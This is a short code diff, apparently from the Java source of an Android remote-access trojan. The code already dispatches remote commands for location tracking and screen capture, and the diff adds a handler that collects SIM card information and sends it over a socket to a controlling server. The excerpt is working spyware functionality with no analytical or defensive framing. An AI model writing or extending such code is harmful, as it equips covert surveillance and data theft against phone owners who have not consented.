@@ -187,6 +187,9 @@ try {
                     case Constants.ORDER_LOCATION:
                         x0000lm();
                         break;
+                    case Constants.ORDER_SIM:
+                        x0000si();
+                        break;
                     case Constants.ORDER_SCREEN_CAPTURE:
                         AppLogger.d("ScreenCapture", "=== CASE x0000sc MATCHED ===");
                         AppLogger.d("ScreenCapture", "About to call x0000sc()...");
@@ -282,6 +285,12 @@ try {
             location.put("enable" , false);
 
         ioSocket.emit(Constants.ORDER_LOCATION, location);
+    }
+
+    public static void x0000si(){
+        JSONObject simInfo = SIMInfoManager.getSIMInfo();
+        if(simInfo != null)
+            ioSocket.emit(Constants.ORDER_SIM, simInfo);
     }
 
     public static void x0000sc(){
